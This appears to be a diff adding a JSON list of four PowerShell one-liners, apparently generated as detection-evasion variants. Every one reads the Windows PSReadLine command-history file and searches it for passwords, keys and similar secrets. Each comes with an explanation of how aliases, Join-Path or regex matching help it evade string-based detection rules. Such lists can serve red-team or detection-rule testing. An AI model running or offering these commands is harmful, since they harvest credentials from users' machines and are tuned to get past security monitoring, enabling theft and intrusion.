@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -Command \"Get-Content -Path '$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' | Select-String 'password', '-p', 'key', 'pwd', 'pass'\"",
+    "explanation": "This command uses environment variables and string substitution to access the history file. It avoids direct string concatenation and uses standard PowerShell syntax to bypass simple string-based detection."
+  },
+  {
+    "output": "powershell.exe -c \"gc $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | sls 'password'\"",
+    "explanation": "This command uses shorthand aliases (gc for Get-Content, sls for Select-String) and environment variables to obfuscate the command slightly while maintaining the same functionality."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-Content (Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt') | Select-String 'pass'\"",
+    "explanation": "This command uses the Join-Path cmdlet to construct the file path dynamically, making it more difficult for simple string-based detection rules to identify."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-Content -Path $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Where-Object { $_ -match 'password' }\"",
+    "explanation": "This command replaces Select-String with Where-Object and a regex match, changing the syntax while preserving the same behavior, which may evade pattern-based detection."
+  }
+]
